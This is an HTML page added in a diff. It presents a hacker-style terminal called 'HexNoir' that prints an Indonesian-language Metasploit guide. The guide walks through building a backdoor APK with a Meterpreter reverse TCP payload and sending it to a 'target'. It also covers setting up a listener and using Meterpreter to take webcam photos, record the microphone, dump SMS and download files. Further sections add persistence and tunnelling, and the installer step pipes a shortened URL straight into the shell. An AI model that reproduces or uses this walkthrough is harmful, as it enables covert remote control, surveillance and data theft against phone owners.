@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>HexNoir :: Panduan Metasploit</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #000;
+      color: #00ff88;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+    }
+    #typing {
+      padding: 15px;
+      font-size: 18px;
+      white-space: nowrap;
+      overflow: hidden;
+      border-right: .15em solid #00ff88;
+      width: 0;
+      animation: typing 3s steps(30, end) forwards, blink .75s step-end infinite;
+    }
+    @keyframes typing {
+      from { width: 0; }
+      to { width: 100%; }
+    }
+    @keyframes blink {
+      0%, 100% { border-color: transparent; }
+      50% { border-color: #00ff88; }
+    }
+    #input-line {
+      display: flex;
+      padding: 15px;
+      border-bottom: 1px solid #00ff88;
+      background: #000;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    #prompt { flex-shrink: 0; }
+    #cmdline {
+      flex: 1;
+      background: transparent;
+      border: none;
+      color: #00ff88;
+      outline: none;
+    }
+    #screen {
+      flex: 1;
+      padding: 15px;
+      overflow-y: auto;
+    }
+    .line {
+      white-space: pre-wrap;
+      padding: 2px 0;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="typing">💀 Halo Mas Yohanes Tant</div>
+
+  <div id="input-line">
+    <div id="prompt">HexNoir&gt;&nbsp;</div>
+    <div contenteditable="true" id="cmdline" spellcheck="false"></div>
+  </div>
+
+  <div id="screen"></div>
+
+  <script>
+    const screen = document.getElementById('screen');
+    const cmd = document.getElementById('cmdline');
+    cmd.focus();
+
+    const commands = {
+      help: () => [
+        "Panduan Utama:",
+        "- install metasploit",
+        "- run metasploit",
+        "- payload apk",
+        "- listener",
+        "- meterpreter",
+        "- persistence",
+        "- tips",
+        "- exit"
+      ],
+      'install metasploit': () => [
+        "Langkah Instalasi Metasploit di Termux:",
+        "1. Update sistem:",
+        "   $ pkg update && pkg upgrade -y",
+        "",
+        "2. Install dependency:",
+        "   $ pkg install git curl wget ruby python clang postgresql -y",
+        "",
+        "3. Inisialisasi PostgreSQL:",
+        "   $ pg_ctl -D $PREFIX/var/lib/postgresql initdb",
+        "",
+        "4. Start PostgreSQL:",
+        "   $ pg_ctl -D $PREFIX/var/lib/postgresql start",
+        "",
+        "5. Jalankan installer Metasploit:",
+        "   $ source <(curl -fsSL https://kutt.it/msf)",
+        "",
+        "Selesai. Gunakan perintah 'run metasploit' untuk lanjut."
+      ],
+      'run metasploit': () => [
+        "Menjalankan Metasploit Console:",
+        "1. Pastikan PostgreSQL aktif:",
+        "   $ pg_ctl -D $PREFIX/var/lib/postgresql start",
+        "",
+        "2. Jalankan metasploit:",
+        "   $ msfconsole",
+        "",
+        "Tunggu hingga prompt 'msf6 >' muncul."
+      ],
+      'payload apk': () => [
+        "Membuat Backdoor APK dengan msfvenom:",
+        "   $ msfvenom -p android/meterpreter/reverse_tcp \\",
+        "     LHOST=192.168.1.100 LPORT=4444 -o backdoor.apk",
+        "",
+        "Ganti IP & Port sesuai listener-mu. Kirim APK ke target."
+      ],
+      'listener': () => [
+        "Menyiapkan Listener di Metasploit:",
+        "   $ use exploit/multi/handler",
+        "   $ set payload android/meterpreter/reverse_tcp",
+        "   $ set LHOST 192.168.1.100",
+        "   $ set LPORT 4444",
+        "   $ exploit",
+        "",
+        "Tunggu koneksi dari perangkat korban."
+      ],
+      'meterpreter': () => [
+        "Perintah Meterpreter yang Sering Digunakan:",
+        "   > sysinfo",
+        "   > webcam_snap",
+        "   > record_mic",
+        "   > dump_sms",
+        "   > shell",
+        "   > cd /sdcard",
+        "   > download file.jpg",
+        "",
+        "Gunakan dengan bijak. Sesi aktif = kontrol penuh."
+      ],
+      'persistence': () => [
+        "Persistence (Opsional):",
+        "   > run persistence",
+        "   > run get_local_subnets",
+        "   > run wifi_list",
+        "",
+        "Berguna agar akses tetap hidup setelah reboot target."
+      ],
+      'tips': () => [
+        "Tips Tambahan:",
+        "- Pastikan LHOST adalah IP lokal aktif (cek: ifconfig)",
+        "- Gunakan VPN/tunnel jika luar jaringan (Ngrok, FRP)",
+        "- Metasploit butuh waktu saat start, sabar!",
+        "- Gunakan payload sesuai OS target"
+      ],
+      exit: () => {
+        screen.innerHTML = '';
+        return ["Session di-reset. Ketik 'help' untuk mulai lagi."];
+      }
+    };
+
+    function printLines(lines) {
+      lines.forEach(l => {
+        const div = document.createElement('div');
+        div.className = 'line';
+        div.textContent = l;
+        screen.appendChild(div);
+        screen.scrollTop = screen.scrollHeight;
+      });
+    }
+
+    cmd.addEventListener('keydown', e => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        const input = cmd.textContent.trim();
+        if (!input) return;
+        printLines(["HexNoir> " + input]);
+        cmd.textContent = '';
+        const fn = commands[input.toLowerCase()];
+        if (fn) {
+          const result = fn();
+          if (Array.isArray(result)) printLines(result);
+        } else {
+          printLines(["Perintah tidak ditemukan. Ketik 'help'."]);
+        }
+      }
+    });
+
+    setTimeout(() => {
+      printLines([
+        "💀 HexNoir Terminal Ready",
+        "Ketik 'help' untuk melihat panduan metasploit."
+      ]);
+    }, 3500);
+  </script>
+
+</body>
+</html>
